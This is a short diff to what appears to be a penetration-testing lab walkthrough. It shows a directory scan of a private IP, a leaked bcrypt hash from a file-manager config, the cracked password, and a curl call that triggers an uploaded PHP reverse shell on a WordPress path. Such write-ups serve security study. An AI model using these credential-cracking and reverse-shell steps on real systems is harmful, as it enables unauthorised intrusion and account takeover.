@@ -426,10 +426,12 @@ feroxbuster -u http://192.168.231.16 -w /usr/share/seclists/Discovery/Web-Conten
 filemanager/config/.htusers.php credential
 'dora','$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS'
 
-# crack
+# crack - 레빗홀
 echo "$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS" > dora.hash
 doraemon
 
+# reverse shell upload
+curl http://192.168.231.16/wp-admin/php-reverse-shell.php
 
 ```
 
